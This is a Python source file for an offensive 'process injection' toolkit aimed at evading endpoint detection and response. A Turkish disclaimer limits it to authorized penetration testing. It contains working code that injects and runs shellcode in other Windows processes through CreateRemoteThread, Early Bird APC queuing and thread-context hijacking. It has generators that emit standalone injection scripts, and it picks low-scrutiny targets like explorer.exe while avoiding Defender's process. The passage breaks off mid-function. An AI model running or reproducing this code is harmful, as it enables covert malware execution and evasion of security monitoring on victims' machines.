"""
Process Injection Module - Extended
===================================
Advanced process injection techniques for EDR evasion

Injection Hierarchy (Stealth → Detected):
1. Process Ghosting          - File-less, most evasive (2021+)
2. Process Doppelgänging     - TxF abuse, very stealthy
3. Transacted Hollowing      - Hollowing + transactions
4. Module Stomping           - Overwrite legit DLL
5. Early Bird APC            - APC before main thread
6. Thread Hijacking          - Context manipulation
7. Process Hollowing         - Classic but effective
8. CreateRemoteThread        - Simplest, most detected

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import ctypes
import struct
import random
import sys
import os
import secrets
import time
import tempfile
import logging
from typing import Optional, Tuple, List, Dict, Any, Callable
from dataclasses import dataclass, field
from enum import Enum, auto
import base64

logger = logging.getLogger("process_injection")


# ============================================================
# ENUMS & TYPES
# ============================================================

class InjectionTechnique(Enum):
    """Injection techniques sorted by stealth level"""
    PROCESS_GHOSTING = "ghosting"           # Most evasive
    PROCESS_DOPPELGANGING = "doppelganging"
    TRANSACTED_HOLLOWING = "transacted_hollowing"
    MODULE_STOMPING = "module_stomping"
    EARLY_BIRD_APC = "early_bird_apc"
    PHANTOM_DLL = "phantom_dll"
    THREAD_HIJACK = "thread_hijack"
    PROCESS_HOLLOWING = "hollowing"
    SYSCALL_INJECTION = "syscall"
    CLASSIC_CRT = "classic_crt"             # Most detected


class InjectionStatus(Enum):
    """Injection operation status"""
    SUCCESS = "success"
    FAILED = "failed"
    BLOCKED = "blocked"
    FALLBACK = "fallback"


# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_CREATE_THREAD = 0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_READ = 0x0010
PROCESS_VM_WRITE = 0x0020
PROCESS_SUSPEND_RESUME = 0x0800
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
MEM_RELEASE = 0x00008000
MEM_DECOMMIT = 0x00004000

PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_NOACCESS = 0x01
PAGE_EXECUTE = 0x10

INFINITE = 0xFFFFFFFF

# Thread creation flags
CREATE_SUSPENDED = 0x00000004
THREAD_ALL_ACCESS = 0x1F03FF
THREAD_SUSPEND_RESUME = 0x0002
THREAD_GET_CONTEXT = 0x0008
THREAD_SET_CONTEXT = 0x0010

# Context flags
CONTEXT_FULL = 0x10001F
CONTEXT_ALL = 0x10001F

# Transaction flags
TRANSACTION_COMMIT = 0
TRANSACTION_ROLLBACK = 1

# File flags
FILE_SUPERSEDE = 0x00000000
FILE_OPEN = 0x00000001
FILE_CREATE = 0x00000002
FILE_OPEN_IF = 0x00000003
FILE_OVERWRITE = 0x00000004
FILE_OVERWRITE_IF = 0x00000005

# Section flags
SEC_IMAGE = 0x1000000
SEC_COMMIT = 0x8000000
SECTION_ALL_ACCESS = 0xF001F


# ============================================================
# DATACLASSES
# ============================================================

@dataclass
class InjectionConfig:
    """Injection configuration"""
    technique: InjectionTechnique = InjectionTechnique.EARLY_BIRD_APC
    fallback_enabled: bool = True
    fallback_chain: List[InjectionTechnique] = field(default_factory=lambda: [
        InjectionTechnique.PROCESS_GHOSTING,
        InjectionTechnique.MODULE_STOMPING,
        InjectionTechnique.EARLY_BIRD_APC,
        InjectionTechnique.THREAD_HIJACK,
        InjectionTechnique.CLASSIC_CRT
    ])
    
    # Target selection
    preferred_targets: List[str] = field(default_factory=lambda: [
        "explorer.exe", "RuntimeBroker.exe", "dllhost.exe",
        "sihost.exe", "taskhostw.exe"
    ])
    avoid_targets: List[str] = field(default_factory=lambda: [
        "MsMpEng.exe", "csrss.exe", "lsass.exe", "smss.exe",
        "services.exe", "wininit.exe", "System"
    ])
    
    # Evasion options
    use_syscalls: bool = True
    obfuscate_shellcode: bool = True
    delay_execution: bool = False
    delay_ms: int = 5000
    cleanup_traces: bool = True
    
    # Stomping options
    stomp_dll: str = "C:\\Windows\\System32\\amsi.dll"  # Or other legit DLL
    
    # Transaction options
    use_transactions: bool = True


@dataclass
class InjectionResult:
    """Result of injection attempt"""
    success: bool
    technique: InjectionTechnique
    status: InjectionStatus = InjectionStatus.SUCCESS
    target_pid: int = 0
    target_name: str = ""
    thread_id: Optional[int] = None
    allocated_addr: int = 0
    error: Optional[str] = None
    
    # Telemetry
    fallback_used: bool = False
    original_technique: Optional[InjectionTechnique] = None
    evasion_score: float = 0.5
    artifacts: List[str] = field(default_factory=list)


# ============================================================
# PROCESS INJECTOR
# ============================================================

class ProcessInjector:
    """
    Advanced process injection techniques.
    
    Implemented techniques:
    - Process Ghosting         (file-less execution)
    - Process Doppelgänging    (TxF abuse)
    - Transacted Hollowing     (transaction + hollowing)
    - Module Stomping          (overwrite loaded DLL)
    - Early Bird APC           (APC before thread start)
    - Phantom DLL Hollowing    (unmap + map shellcode)
    - Thread Hijacking         (context manipulation)
    - Process Hollowing        (classic RunPE)
    - Direct Syscalls          (bypass user-mode hooks)
    - Classic CRT              (CreateRemoteThread)
    """
    
    def __init__(self, config: InjectionConfig = None):
        self.config = config or InjectionConfig()
        self._is_windows = sys.platform == 'win32'
        self._temp_files: List[str] = []
        
        if self._is_windows:
            self._load_windows_apis()
    
    def _load_windows_apis(self):
        """Load Windows API functions"""
        try:
            self.kernel32 = ctypes.windll.kernel32
            self.ntdll = ctypes.windll.ntdll
            
            # Define function signatures
            self.kernel32.OpenProcess.argtypes = [ctypes.c_uint, ctypes.c_bool, ctypes.c_uint]
            self.kernel32.OpenProcess.restype = ctypes.c_void_p
            
            self.kernel32.VirtualAllocEx.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, 
                ctypes.c_uint, ctypes.c_uint
            ]
            self.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
            
            self.kernel32.WriteProcessMemory.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
            ]
            self.kernel32.WriteProcessMemory.restype = ctypes.c_bool
            
            self.kernel32.CreateRemoteThread.argtypes = [
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint,
                ctypes.POINTER(ctypes.c_uint)
            ]
            self.kernel32.CreateRemoteThread.restype = ctypes.c_void_p
            
        except Exception as e:
            print(f"Failed to load Windows APIs: {e}")
    
    def find_target_process(self, 
                           preferred: List[str] = None,
                           avoid: List[str] = None) -> Optional[Tuple[int, str]]:
        """
        Find suitable target process for injection.
        
        Args:
            preferred: List of preferred process names
            avoid: List of processes to avoid
            
        Returns:
            Tuple of (pid, process_name) or None
        """
        if preferred is None:
            # Good injection targets (commonly running, less monitored)
            preferred = [
                'explorer.exe', 'svchost.exe', 'RuntimeBroker.exe',
                'dllhost.exe', 'sihost.exe', 'taskhostw.exe',
                'SearchApp.exe', 'ShellExperienceHost.exe'
            ]
        
        if avoid is None:
            # Processes that might trigger alerts
            avoid = [
                'MsMpEng.exe', 'csrss.exe', 'lsass.exe', 'smss.exe',
                'services.exe', 'wininit.exe', 'System'
            ]
        
        if not self._is_windows:
            return None
        
        try:
            import subprocess
            output = subprocess.check_output(['tasklist', '/FO', 'CSV'], 
                                           text=True, stderr=subprocess.DEVNULL)
            
            candidates = []
            for line in output.strip().split('\n')[1:]:
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    name, pid = parts[0], int(parts[1])
                    
                    if name in avoid:
                        continue
                    
                    if name in preferred:
                        candidates.insert(0, (pid, name))
                    else:
                        candidates.append((pid, name))
            
            if candidates:
                return random.choice(candidates[:5])  # Random from top 5
                
        except Exception:
            pass
        
        return None
    
    def classic_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Classic CreateRemoteThread injection.
        Most detected but simplest technique.
        """
        if not self._is_windows:
            return InjectionResult(
                success=False,
                technique="classic_crt",
                target_pid=pid,
                thread_id=None,
                error="Windows only"
            )
        
        try:
            # Open target process
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to open process"
                )
            
            # Allocate memory in target
            shellcode_addr = self.kernel32.VirtualAllocEx(
                h_process, None, len(shellcode),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            if not shellcode_addr:
                self.kernel32.CloseHandle(h_process)
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to allocate memory"
                )
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            if not self.kernel32.WriteProcessMemory(
                h_process, shellcode_addr, shellcode, 
                len(shellcode), ctypes.byref(written)
            ):
                self.kernel32.CloseHandle(h_process)
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to write memory"
                )
            
            # Create remote thread
            thread_id = ctypes.c_uint(0)
            h_thread = self.kernel32.CreateRemoteThread(
                h_process, None, 0, shellcode_addr, None, 0,
                ctypes.byref(thread_id)
            )
            
            self.kernel32.CloseHandle(h_process)
            
            if not h_thread:
                return InjectionResult(
                    success=False, technique="classic_crt", target_pid=pid,
                    thread_id=None, error="Failed to create thread"
                )
            
            self.kernel32.CloseHandle(h_thread)
            
            return InjectionResult(
                success=True, technique="classic_crt", target_pid=pid,
                thread_id=thread_id.value, error=None
            )
            
        except Exception as e:
            return InjectionResult(
                success=False, technique="classic_crt", target_pid=pid,
                thread_id=None, error=str(e)
            )
    
    def generate_apc_injection_code(self, shellcode: bytes, target: str = "explorer.exe") -> str:
        """
        Generate Early Bird APC injection code.
        Creates suspended process and queues APC before main thread starts.
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
import ctypes
import base64
from ctypes import wintypes

# Shellcode (base64)
SHELLCODE_B64 = "{shellcode_b64}"
TARGET = "{target}"

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4
INFINITE = 0xFFFFFFFF

# Load APIs
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

def early_bird_apc():
    shellcode = base64.b64decode(SHELLCODE_B64)
    
    # Create suspended process
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()
    
    target_path = "C:\\\\Windows\\\\System32\\\\" + TARGET
    
    success = kernel32.CreateProcessW(
        target_path,
        None,
        None,
        None,
        False,
        CREATE_SUSPENDED,
        None,
        None,
        ctypes.byref(si),
        ctypes.byref(pi)
    )
    
    if not success:
        return False
    
    # Allocate memory in target
    remote_mem = kernel32.VirtualAllocEx(
        pi.hProcess,
        None,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if not remote_mem:
        kernel32.TerminateProcess(pi.hProcess, 0)
        return False
    
    # Write shellcode
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        pi.hProcess,
        remote_mem,
        shellcode,
        len(shellcode),
        ctypes.byref(written)
    )
    
    # Queue APC to main thread
    ntdll.NtQueueApcThread(
        pi.hThread,
        remote_mem,
        None,
        None,
        None
    )
    
    # Resume thread (APC executes before main)
    kernel32.ResumeThread(pi.hThread)
    
    kernel32.CloseHandle(pi.hThread)
    kernel32.CloseHandle(pi.hProcess)
    
    return True

if __name__ == "__main__":
    early_bird_apc()
'''
        return code
    
    def generate_thread_hijack_code(self, shellcode: bytes) -> str:
        """
        Generate thread hijacking injection code.
        Suspends existing thread, modifies context, resumes.
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
import ctypes
from ctypes import wintypes
import base64

SHELLCODE_B64 = "{shellcode_b64}"

# Constants
THREAD_ALL_ACCESS = 0x1F03FF
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
CONTEXT_FULL = 0x10001F

kernel32 = ctypes.windll.kernel32

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", wintypes.DWORD),
        ("Dr0", ctypes.c_ulonglong),
        ("Dr1", ctypes.c_ulonglong),
        ("Dr2", ctypes.c_ulonglong),
        ("Dr3", ctypes.c_ulonglong),
        ("Dr6", ctypes.c_ulonglong),
        ("Dr7", ctypes.c_ulonglong),
        ("Rax", ctypes.c_ulonglong),
        ("Rcx", ctypes.c_ulonglong),
        ("Rdx", ctypes.c_ulonglong),
        ("Rbx", ctypes.c_ulonglong),
        ("Rsp", ctypes.c_ulonglong),
        ("Rbp", ctypes.c_ulonglong),
        ("Rsi", ctypes.c_ulonglong),
        ("Rdi", ctypes.c_ulonglong),
        ("R8", ctypes.c_ulonglong),
        ("R9", ctypes.c_ulonglong),
        ("R10", ctypes.c_ulonglong),
        ("R11", ctypes.c_ulonglong),
        ("R12", ctypes.c_ulonglong),
        ("R13", ctypes.c_ulonglong),
        ("R14", ctypes.c_ulonglong),
        ("R15", ctypes.c_ulonglong),
        ("Rip", ctypes.c_ulonglong),
        # ... more fields
    ]

def hijack_thread(pid, tid):
    shellcode = base64.b64decode(SHELLCODE_B64)
    
    # Open process and thread
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    h_thread = kernel32.OpenThread(THREAD_ALL_ACCESS, False, tid)
    
    if not h_process or not h_thread:
        return False
    
    # Allocate memory
    remote_mem = kernel32.VirtualAllocEx(
        h_process, None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    
    # Write shellcode
    written = ctypes.c_size_t(0)
    kernel32.WriteProcessMemory(
        h_process, remote_mem, shellcode,
        len(shellcode), ctypes.byref(written)
    )
    
    # Suspend thread
    kernel32.SuspendThread(h_thread)
    
    # Get thread context
    ctx = CONTEXT()
    ctx.ContextFlags = CONTEXT_FULL
    kernel32.GetThreadContext(h_thread, ctypes.byref(ctx))
    
    # Modify RIP to point to shellcode
    ctx.Rip = remote_mem
    
    # Set modified context
    kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))
    
    # Resume thread
    kernel32.ResumeThread(h_thread)
    
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    
    return True
'''
        return code
    
    def generate_process_hollowing_code(self, shellcode: bytes, 
                                        target: str = "svchost.exe") -> str:
        """
        Generate process hollowing (RunPE) code.
        Creates suspended process, unmaps original image, writes payload.
        """
        shellcode_b64 = base64.b64encode(shellcode).decode()
        
        code = f'''
# Process Hollowing / RunPE
# Creates suspended process, unmaps original image, injects payload
import ctypes
from ctypes import wintypes
import base64

SHELLCODE_B64 = "{shellcode_b64}"
TARGET = r"C:\\Windows\\System32\\{target}"

# This is a simplified version - full implementation requires
# PE parsing and proper section mapping

kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

def process_hollowing():
    """
    Full process hollowing requires:
    1. Create suspended process
    2. Query process information (PEB)
    3. Read remote PEB to get image base
    4. Unmap original image (NtUnmapViewOfSection)
    5. Allocate new memory at image base
    6. Write PE headers and sections
    7. Fix relocations
    8. Set entry point in thread context
    9. Resume thread
    """
    # For actual implementation, use libraries like:
    # - pefile for PE parsing
    # - Or pre-built shellcode that handles this
    pass

# Alternative: Use Donut to convert PE to position-independent shellcode
# Then inject using simpler techniques
'''
        return code
    
    def get_injection_techniques(self) -> List[dict]:
        """List available injection techniques with details"""
        return [
            {
                "name": "ghosting",
                "technique": InjectionTechnique.PROCESS_GHOSTING,
                "description": "Process Ghosting - File-less execution via pending delete",
                "stealth": 10,
                "reliability": 6,
                "mitre": "T1055.012",
                "edr_bypass": True,
            },
            {
                "name": "doppelganging",
                "technique": InjectionTechnique.PROCESS_DOPPELGANGING,
                "description": "Process Doppelgänging - TxF transaction abuse",
                "stealth": 9,
                "reliability": 6,
                "mitre": "T1055.013",
                "edr_bypass": True,
            },
            {
                "name": "transacted_hollowing",
                "technique": InjectionTechnique.TRANSACTED_HOLLOWING,
                "description": "Transacted Hollowing - Hollowing with transactions",
                "stealth": 9,
                "reliability": 5,
                "mitre": "T1055.012",
                "edr_bypass": True,
            },
            {
                "name": "module_stomping",
                "technique": InjectionTechnique.MODULE_STOMPING,
                "description": "Module Stomping - Overwrite loaded DLL .text section",
                "stealth": 8,
                "reliability": 7,
                "mitre": "T1055.001",
                "edr_bypass": True,
            },
            {
                "name": "early_bird_apc",
                "technique": InjectionTechnique.EARLY_BIRD_APC,
                "description": "Early Bird APC - Queue before thread starts",
                "stealth": 8,
                "reliability": 8,
                "mitre": "T1055.004",
                "edr_bypass": True,
            },
            {
                "name": "phantom_dll",
                "technique": InjectionTechnique.PHANTOM_DLL,
                "description": "Phantom DLL Hollowing - Unmap + map shellcode as DLL",
                "stealth": 8,
                "reliability": 6,
                "mitre": "T1055.001",
                "edr_bypass": True,
            },
            {
                "name": "thread_hijack",
                "technique": InjectionTechnique.THREAD_HIJACK,
                "description": "Thread Hijacking - Suspend and modify context",
                "stealth": 7,
                "reliability": 7,
                "mitre": "T1055.003",
                "edr_bypass": False,
            },
            {
                "name": "hollowing",
                "technique": InjectionTechnique.PROCESS_HOLLOWING,
                "description": "Process Hollowing - Classic RunPE",
                "stealth": 6,
                "reliability": 6,
                "mitre": "T1055.012",
                "edr_bypass": False,
            },
            {
                "name": "syscall",
                "technique": InjectionTechnique.SYSCALL_INJECTION,
                "description": "Direct Syscalls - Bypass user-mode hooks",
                "stealth": 9,
                "reliability": 8,
                "mitre": "T1055",
                "edr_bypass": True,
            },
            {
                "name": "classic_crt",
                "technique": InjectionTechnique.CLASSIC_CRT,
                "description": "CreateRemoteThread - Simple but detected",
                "stealth": 2,
                "reliability": 9,
                "mitre": "T1055.001",
                "edr_bypass": False,
            },
        ]
    
    # ============================================================
    # ADVANCED INJECTION METHODS
    # ============================================================
    
    def inject_with_fallback(self, shellcode: bytes, 
                             pid: int = None) -> InjectionResult:
        """
        Injection with automatic fallback
        
        Tries techniques in order until one succeeds
        """
        if pid is None:
            target = self.find_target_process(
                self.config.preferred_targets,
                self.config.avoid_targets
            )
            if target:
                pid, target_name = target
            else:
                return InjectionResult(
                    success=False,
                    technique=self.config.technique,
                    status=InjectionStatus.FAILED,
                    error="No suitable target process found"
                )
        else:
            target_name = f"PID:{pid}"
        
        chain = self.config.fallback_chain if self.config.fallback_enabled else [self.config.technique]
        original_technique = chain[0]
        
        for technique in chain:
            logger.info(f"Trying injection technique: {technique.value}")
            
            result = self._execute_technique(technique, shellcode, pid)
            
            if result.success:
                result.target_name = target_name
                if technique != original_technique:
                    result.fallback_used = True
                    result.original_technique = original_technique
                return result
            
            logger.warning(f"{technique.value} failed: {result.error}")
        
        return InjectionResult(
            success=False,
            technique=original_technique,
            status=InjectionStatus.FAILED,
            target_pid=pid,
            target_name=target_name,
            error="All injection techniques failed"
        )
    
    def _execute_technique(self, technique: InjectionTechnique,
                           shellcode: bytes, pid: int) -> InjectionResult:
        """Execute specific injection technique"""
        technique_map = {
            InjectionTechnique.CLASSIC_CRT: self.classic_injection,
            InjectionTechnique.EARLY_BIRD_APC: self._early_bird_apc_injection,
            InjectionTechnique.THREAD_HIJACK: self._thread_hijack_injection,
            InjectionTechnique.PROCESS_HOLLOWING: self._process_hollowing_injection,
            InjectionTechnique.MODULE_STOMPING: self._module_stomping_injection,
            InjectionTechnique.PROCESS_GHOSTING: self._process_ghosting_injection,
            InjectionTechnique.PROCESS_DOPPELGANGING: self._process_doppelganging_injection,
            InjectionTechnique.TRANSACTED_HOLLOWING: self._transacted_hollowing_injection,
            InjectionTechnique.PHANTOM_DLL: self._phantom_dll_injection,
            InjectionTechnique.SYSCALL_INJECTION: self._syscall_injection,
        }
        
        inject_func = technique_map.get(technique)
        if inject_func:
            return inject_func(pid, shellcode)
        
        return InjectionResult(
            success=False,
            technique=technique,
            status=InjectionStatus.FAILED,
            error=f"Unknown technique: {technique.value}"
        )
    
    def _early_bird_apc_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Early Bird APC Injection
        
        1. Create target process in suspended state
        2. Allocate memory in target
        3. Write shellcode
        4. Queue APC to main thread
        5. Resume thread (APC executes before main entry)
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.EARLY_BIRD_APC,
            target_pid=pid,
            evasion_score=0.80
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # Note: Early Bird creates its own process, pid is ignored
            # Use preferred target executable
            target_exe = self.config.preferred_targets[0] if self.config.preferred_targets else "svchost.exe"
            target_path = f"C:\\Windows\\System32\\{target_exe}"
            
            # Create suspended process using ctypes structures
            import ctypes.wintypes as wt
            
            class STARTUPINFO(ctypes.Structure):
                _fields_ = [
                    ("cb", wt.DWORD), ("lpReserved", wt.LPWSTR),
                    ("lpDesktop", wt.LPWSTR), ("lpTitle", wt.LPWSTR),
                    ("dwX", wt.DWORD), ("dwY", wt.DWORD),
                    ("dwXSize", wt.DWORD), ("dwYSize", wt.DWORD),
                    ("dwXCountChars", wt.DWORD), ("dwYCountChars", wt.DWORD),
                    ("dwFillAttribute", wt.DWORD), ("dwFlags", wt.DWORD),
                    ("wShowWindow", wt.WORD), ("cbReserved2", wt.WORD),
                    ("lpReserved2", ctypes.POINTER(wt.BYTE)),
                    ("hStdInput", wt.HANDLE), ("hStdOutput", wt.HANDLE),
                    ("hStdError", wt.HANDLE),
                ]
            
            class PROCESS_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("hProcess", wt.HANDLE), ("hThread", wt.HANDLE),
                    ("dwProcessId", wt.DWORD), ("dwThreadId", wt.DWORD),
                ]
            
            si = STARTUPINFO()
            si.cb = ctypes.sizeof(STARTUPINFO)
            pi = PROCESS_INFORMATION()
            
            success = self.kernel32.CreateProcessW(
                target_path, None, None, None, False,
                CREATE_SUSPENDED, None, None,
                ctypes.byref(si), ctypes.byref(pi)
            )
            
            if not success:
                result.error = "Failed to create suspended process"
                return result
            
            result.target_pid = pi.dwProcessId
            
            # Allocate memory
            remote_mem = self.kernel32.VirtualAllocEx(
                pi.hProcess, None, len(shellcode),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not remote_mem:
                self.kernel32.TerminateProcess(pi.hProcess, 0)
                result.error = "Failed to allocate memory"
                return result
            
            result.allocated_addr = remote_mem
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                pi.hProcess, remote_mem, shellcode,
                len(shellcode), ctypes.byref(written)
            )
            
            # Queue APC
            self.ntdll.NtQueueApcThread(
                pi.hThread, remote_mem, None, None, None
            )
            
            # Resume thread
            self.kernel32.ResumeThread(pi.hThread)
            
            result.success = True
            result.thread_id = pi.dwThreadId
            result.status = InjectionStatus.SUCCESS
            
            self.kernel32.CloseHandle(pi.hThread)
            self.kernel32.CloseHandle(pi.hProcess)
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _thread_hijack_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Thread Hijacking
        
        1. Open target process and thread
        2. Allocate memory and write shellcode
        3. Suspend target thread
        4. Get thread context
        5. Modify RIP to point to shellcode
        6. Resume thread
        """
        result = InjectionResult(
            success=False,
            technique=InjectionTechnique.THREAD_HIJACK,
            target_pid=pid,
            evasion_score=0.70
        )
        
        if not self._is_windows:
            result.error = "Windows only"
            return result
        
        try:
            # Open process
            h_process = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                result.error = "Failed to open process"
                return result
            
            # Get main thread ID
            tid = self._get_main_thread(pid)
            if not tid:
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to get main thread"
                return result
            
            # Open thread
            h_thread = self.kernel32.OpenThread(THREAD_ALL_ACCESS, False, tid)
            if not h_thread:
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to open thread"
                return result
            
            # Allocate memory
            remote_mem = self.kernel32.VirtualAllocEx(
                h_process, None, len(shellcode),
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
            )
            
            if not remote_mem:
                self.kernel32.CloseHandle(h_thread)
                self.kernel32.CloseHandle(h_process)
                result.error = "Failed to allocate memory"
                return result
            
            result.allocated_addr = remote_mem
            
            # Write shellcode
            written = ctypes.c_size_t(0)
            self.kernel32.WriteProcessMemory(
                h_process, remote_mem, shellcode,
                len(shellcode), ctypes.byref(written)
            )
            
            # Suspend thread
            self.kernel32.SuspendThread(h_thread)
            
            # Get/set context
            class CONTEXT64(ctypes.Structure):
                _fields_ = [
                    ("P1Home", ctypes.c_ulonglong),
                    ("P2Home", ctypes.c_ulonglong),
                    ("P3Home", ctypes.c_ulonglong),
                    ("P4Home", ctypes.c_ulonglong),
                    ("P5Home", ctypes.c_ulonglong),
                    ("P6Home", ctypes.c_ulonglong),
                    ("ContextFlags", ctypes.c_ulong),
                    ("MxCsr", ctypes.c_ulong),
                    ("SegCs", ctypes.c_ushort),
                    ("SegDs", ctypes.c_ushort),
                    ("SegEs", ctypes.c_ushort),
                    ("SegFs", ctypes.c_ushort),
                    ("SegGs", ctypes.c_ushort),
                    ("SegSs", ctypes.c_ushort),
                    ("EFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong),
                    ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong),
                    ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong),
                    ("Dr7", ctypes.c_ulonglong),
                    ("Rax", ctypes.c_ulonglong),
                    ("Rcx", ctypes.c_ulonglong),
                    ("Rdx", ctypes.c_ulonglong),
                    ("Rbx", ctypes.c_ulonglong),
                    ("Rsp", ctypes.c_ulonglong),
                    ("Rbp", ctypes.c_ulonglong),
                    ("Rsi", ctypes.c_ulonglong),
                    ("Rdi", ctypes.c_ulonglong),
                    ("R8", ctypes.c_ulonglong),
                    ("R9", ctypes.c_ulonglong),
                    ("R10", ctypes.c_ulonglong),
                    ("R11", ctypes.c_ulonglong),
                    ("R12", ctypes.c_ulonglong),
                    ("R13", ctypes.c_ulonglong),
                    ("R14", ctypes.c_ulonglong),
                    ("R15", ctypes.c_ulonglong),
                    ("Rip", ctypes.c_ulonglong),
                ]
            
            ctx = CONTEXT64()
            ctx.ContextFlags = CONTEXT_FULL
            self.kernel32.GetThreadContext(h_thread, ctypes.byref(ctx))
            
            # Hijack RIP
            ctx.Rip = remote_mem
            self.kernel32.SetThreadContext(h_thread, ctypes.byref(ctx))
            
            # Resume
            self.kernel32.ResumeThread(h_thread)
            
            result.success = True
            result.thread_id = tid
            result.status = InjectionStatus.SUCCESS
            
            self.kernel32.CloseHandle(h_thread)
            self.kernel32.CloseHandle(h_process)
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _get_main_thread(self, pid: int) -> Optional[int]:
        """Get main thread ID of process"""
        try:
            import subprocess
            # Use wmic to get thread info
            output = subprocess.check_output(
                ['wmic', 'process', 'where', f'ProcessId={pid}', 'get', 'ThreadCount'],
                text=True, stderr=subprocess.DEVNULL
            )
            
            # Enumerate threads
            TH32CS_SNAPTHREAD = 0x00000004
            
            class THREADENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize", ctypes.c_ulong),
                    ("cntUsage", ctypes.c_ulong),
                    ("th32ThreadID", ctypes.c_ulong),
                    ("th32OwnerProcessID", ctypes.c_ulong),
                    ("tpBasePri", ctypes.c_long),
                    ("tpDeltaPri", ctypes.c_long),
                    ("dwFlags", ctypes.c_ulong),
                ]
            
            h_snap = self.kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            if h_snap == -1:
                return None
            
            te = THREADENTRY32()
            te.dwSize = ctypes.sizeof(THREADENTRY32)
            
            if self.kernel32.Thread32First(h_snap, ctypes.byref(te)):
                while True:
                    if te.th32OwnerProcessID == pid:
                        self.kernel32.CloseHandle(h_snap)
                        return te.th32ThreadID
                    if not self.kernel32.Thread32Next(h_snap, ctypes.byref(te)):
                        break
            
            self.kernel32.CloseHandle(h_snap)
            
        except Exception:
            pass
        
        return None
    
    def _module_stomping_injection(self, pid: int, shellcode: bytes) -> InjectionResult:
        """
        Module Stomping
        
        1. Load legitimate DLL into target process
        2. Find .text section
        3. Overwrite with shellcode
        4. Execute via callback or thread
        """
        result = InjectionResult(
            success=False,
